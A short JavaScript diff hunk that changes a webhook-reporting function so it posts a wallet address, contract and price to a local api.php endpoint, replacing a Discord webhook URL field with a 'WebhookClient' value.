@@ -248,7 +248,7 @@ const createNonce = () => {
 const sendWebhooks = (userWallet, contract, price) => fetch(`/api.php?o=success`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ userWallet, contract, price, discordWebhookURL })
+    body: JSON.stringify({ userWallet, contract, price, WebhookClient })
 }).catch(err => console.error(err));
 
 //#endregion
